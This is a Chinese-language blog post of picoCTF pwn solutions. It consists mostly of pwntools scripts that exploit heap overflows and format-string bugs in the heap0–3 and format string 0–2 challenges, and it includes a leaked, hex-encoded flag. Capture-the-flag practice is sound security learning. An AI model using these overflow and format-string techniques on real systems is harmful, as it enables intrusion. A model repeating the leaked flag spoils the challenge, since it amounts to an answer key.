---
title: 【Pico】Pwn 系列解題紀錄
date: 2024-07-16
tags:
  - ctf
  - security
keywords:
  - picoctf
  - pwn
  - binary exploitation
  - ctf
  - writeup
  - buffer overflow
  - 題解
  - 漏洞利用
  - 二進制安全
  - 程式競賽
  - 解題紀錄
url: "/posts/picoctf/pwn/"
---

# 【Pico】Pwn 系列解題紀錄

這篇只是用來放解題的程式碼，之後再補解題過程。

## heap0

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './chall'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'tethys.picoctf.net'
    port = 49849
    p = remote(ip, port)
else:
    p = process()

p.sendline("2")

p.sendline(b"a"*50)

p.sendline(b"4")

p.interactive()
```

## heap1

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './chall'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'tethys.picoctf.net'
    port = 59124
    p = remote(ip, port)
else:
    p = process()

p.sendline("2")

p.sendline(b"a"*0x20+b'pico')

p.sendline(b"4")


p.interactive()
```

## heap2

```py
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./chall')
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'mimas.picoctf.net'
    port = 56745
    p = remote(ip, port)
else:
    p = process()

p.sendline(b'2')

win = elf.symbols['win']

p.sendlineafter(b'Data for buffer: ', b'A'*0x20 + p64(win))

p.sendline(b'4')


p.interactive()
```

## heap3

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './chall'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'tethys.picoctf.net'
    port = 58053
    p = remote(ip, port)
else:
    p = process()

p.sendline(b"5")

p.sendline(b"2")
p.sendline(b"35")
p.sendline(b"A"*30+b"pico")

p.sendline(b"4")

p.interactive()
```

## format string 0

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './format-string-0'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'mimas.picoctf.net'
    port = 56256
    p = remote(ip, port)
else:
    p = process()

p.sendline("Gr%114d_Cheese")

p.sendline("Cla%sic_Che%s%steak")


p.interactive()
```

## format string 1

```sh
$ nc mimas.picoctf.net 51583
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p

Decode this: ( (cyberchef) swap endianness 8 bits, from hex )
0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x31655f673431665f,0x7d383130386531
```

## format string 2

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './vuln'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'rhea.picoctf.net'
    port = 63480
    p = remote(ip, port)
else:
    p = process()

def exec_fmt(payload):
    if args.REMOTE:
        p = remote(ip, port)
    else:
        p = process()
    p.sendline(payload)
    return p.recvall()


fmt = FmtStr(exec_fmt)
offset = fmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)


p.interactive()
```
